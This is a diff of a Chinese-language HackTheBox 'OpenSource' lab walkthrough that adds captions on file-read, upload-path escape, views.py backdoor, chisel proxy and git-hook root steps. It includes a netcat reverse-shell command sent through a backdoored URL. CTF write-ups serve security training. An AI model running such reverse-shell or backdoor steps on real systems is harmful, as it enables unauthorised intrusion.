@@ -14,47 +14,57 @@ tags: pentest hackthebox Walkthrough
 | Kali Linux       | 10.10.14.8   |
 | My Ubuntu Server | 192.168.1.13 |
 
+## 漏洞发现
+
+### 任意文件读取
+
 ![1](https://static.iihack.com/hackthebox/machines/OpenSource/1.jpg)
 
+
+### 文件上传目录逃逸
 
 
 ![2](https://static.iihack.com/hackthebox/machines/OpenSource/2.jpg)
 
-
-
-
+测试环境测试后门
 
 ![3](https://static.iihack.com/hackthebox/machines/OpenSource/3.jpg)
-
+测试环境上传成功
 
 
 ![4](https://static.iihack.com/hackthebox/machines/OpenSource/4.jpg)
 
-
+views.py 文件覆写成功
 
 ![5](https://static.iihack.com/hackthebox/machines/OpenSource/5.jpg)
 
-
+读取靶机views.py
 
 ![6](https://static.iihack.com/hackthebox/machines/OpenSource/6.jpg)
 
-
+靶机覆写views.py
 
 ![7](https://static.iihack.com/hackthebox/machines/OpenSource/7.jpg)
+
+
+
+读取覆写后的views.py
 
 ![8](https://static.iihack.com/hackthebox/machines/OpenSource/8.jpg)
 
 
 
-
+反弹shell
 
 ```http
 http://10.10.11.164/shell?cmd=nc 10.10.14.8 444 -e /bin/sh
 ```
 
+获得docker容器root权限
+
 ![9](https://static.iihack.com/hackthebox/machines/OpenSource/9.jpg)
 
-
+源码包本地查看日志，对比文件
 
 ```bash
 $ git checkout dev
@@ -120,10 +130,10 @@ index 0000000..5975e3f
 
 发现用户名密码
 
+在容器内使用[chisel](https://www.iihack.com/pages/tools/chisel.html)开socks5代理
 
 
-
-```
+```bash
 ┌──(kali㉿kali)-[~/]
 └─$ sudo ./chisel_1.7.7_linux_amd64 server --port 3000 -v --reverse --socks5
 
@@ -148,9 +158,11 @@ index 0000000..5975e3f
 
 
 
+参考<https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/>
 
+写入文件
 
-```
+```bash
 $ cat /home/dev01/.git/hooks/pre-commit
 
 #!/bin/bash
@@ -162,12 +174,12 @@ touch /tmp/te
 
 
 
-```
+```bash
 $ chmod +x  /home/dev01/.git/hooks/pre-commit
 ```
 
 
 
-等定时任务执行后，就可以获得root shell成功
+等定时任务执行，获得root shell成功
 
 ![13](https://static.iihack.com/hackthebox/machines/OpenSource/13.jpg)
